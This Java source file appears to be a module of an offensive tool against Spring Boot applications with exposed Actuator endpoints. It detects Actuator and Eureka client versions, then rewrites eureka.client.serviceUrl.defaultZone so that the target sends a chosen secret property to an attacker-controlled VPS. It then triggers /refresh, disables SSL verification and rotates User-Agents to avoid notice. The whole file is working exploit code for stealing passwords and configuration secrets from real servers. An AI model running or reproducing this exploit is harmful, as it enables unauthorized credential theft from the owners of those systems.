package src.main.module;

import src.main.common.UA_Config;
import src.main.impl.ResultCallback;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class GetSpPassWord_II {
    private final String address;
    private final String vpsIP;
    private final String vpsPORT;
    private final String args;
    public String text;
    public GetSpPassWord_II(String address,String vpsIP,String vpsPORT,String args){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPORT = vpsPORT;
        this.args = args;
    }

    public void Result1(ResultCallback callback) throws IOException {
        String api = "/env";
        String refapi = "/refresh";
        String site = address + api;
        String refsite = address + refapi;
        String llib = "spring-boot-starter-actuator";
        String llib1 = "spring-cloud-starter-netflix-eureka-client";
        String expdata = "eureka.client.serviceUrl.defaultZone=http://value:${%s}@%s";
        String data = String.format(expdata,args,vpsIP+":"+vpsPORT);
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib))&&(response.toString().contains(llib1))) {
                String regex1 = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                String regex2 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern2 = Pattern.compile(regex2);
                Matcher matcher2 = pattern2.matcher(response.toString());
                if (matcher1.find() && matcher2.find()) {
                    text = String.format("eureka-client 依赖为: %s", matcher1.group(1));
                    callback.onResult(text);
                    text = String.format("spring-boot-starter-actuator 依赖为: %s", matcher2.group(1));
                    callback.onResult(text);
                    URL obj1 = new URL(site);
                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                    ua = uacf.getRandomUserAgent(ualist);
                    conn1.setRequestProperty("User-Agent",ua);
                    conn1.setRequestMethod("POST");
                    conn1.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    conn1.setDoOutput(true);
                    try (OutputStream os = conn1.getOutputStream()) {
                        byte[] input = data.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    int responseCode1 = conn1.getResponseCode();
                    if (responseCode1 == HttpURLConnection.HTTP_OK) {
                        URL obj2 = new URL(refsite);
                        HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                        ua = uacf.getRandomUserAgent(ualist);
                        conn2.setRequestProperty("User-Agent",ua);
                        conn2.setRequestMethod("POST");
                        conn2.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                        int responseCode2 = conn2.getResponseCode();
                        if (responseCode2 == HttpURLConnection.HTTP_OK) {
                            text = "请求成功！请在你的反弹服务器上查看";
                            callback.onResult(text);
                        } else {
                            text = "发送请求失败！";
                            callback.onResult(text);
                        }
                    } else {
                        text = "发送请求失败";
                        callback.onResult(text);
                    }
                }else{
                    text = "发送请求失败！";
                    callback.onResult(text);
                }
            }
            }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void Result2(ResultCallback callback) {
        String api = "/actuator/env";
        String site = address + api;
        String refapi = "/actuator/refresh";
        String refsite = address + refapi;
        String llib = "spring-boot-starter-actuator";
        String llib1 = "spring-cloud-starter-netflix-eureka-client";
        String expdata = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://value:${%s}@%s\"}";
        String data = String.format(expdata,args,vpsIP+":"+vpsPORT);
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib))&&(response.toString().contains(llib1))) {
                String regex1 = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                String regex2 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern2 = Pattern.compile(regex2);
                Matcher matcher2 = pattern2.matcher(response.toString());
                if (matcher1.find() && matcher2.find()) {
                    text = String.format("eureka-client 依赖为: %s", matcher1.group(1));
                    callback.onResult(text);
                    text = String.format("spring-boot-starter-actuator 依赖为: %s", matcher2.group(1));
                    callback.onResult(text);
                    URL obj1 = new URL(site);
                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                    ua = uacf.getRandomUserAgent(ualist);
                    conn1.setRequestProperty("User-Agent",ua);
                    conn1.setRequestMethod("POST");
                    conn1.setRequestProperty("Content-Type", "application/application/json");
                    conn1.setDoOutput(true);
                    try (OutputStream os = conn1.getOutputStream()) {
                        byte[] input = data.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    int responseCode1 = conn1.getResponseCode();
                    if (responseCode1 == HttpURLConnection.HTTP_OK) {
                        URL obj2 = new URL(refsite);
                        HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                        ua = uacf.getRandomUserAgent(ualist);
                        conn2.setRequestProperty("User-Agent",ua);
                        conn2.setRequestMethod("POST");
                        conn2.setRequestProperty("Content-Type", "application/json");
                        int responseCode2 = conn2.getResponseCode();
                        if (responseCode2 == HttpURLConnection.HTTP_OK) {
                            String result = "请求成功，请在你的反弹服务器上查看";
                            callback.onResult(result);
                        } else {
                            text = "发送请求失败！";
                            callback.onResult(text);
                        }
                    } else {
                        text = "发送请求失败！";
                        callback.onResult(text);
                    }
                }else{
                    text = "未匹配到所需依赖！";
                    callback.onResult(text);
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void Exp(ResultCallback callback) throws IOException {
        // 先判断springboot版本
        // Result1 3 为 sp1
        // Result2 4 为 sp2
        String site = address + "/env";
        String ua  = "";
        disableSSLVerification();
        URL obj = new URL(site);
        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
        UA_Config uacf = new UA_Config();
        List<String> ualist = uacf.loadUserAgents();
        ua = uacf.getRandomUserAgent(ualist);
        conn.setRequestProperty("User-Agent",ua);
        conn.setRequestMethod("GET");
        int responseCode = conn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK){
            text = "当前版本为springboot1";
            callback.onResult(text);
            Result1(callback);
        }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
            text = "当前版本为springboot2";
            callback.onResult(text);
            Result2(callback);
        }else{
            text = "无法确认springboot版本，请重试";
            callback.onResult(text);
        }
    }
}
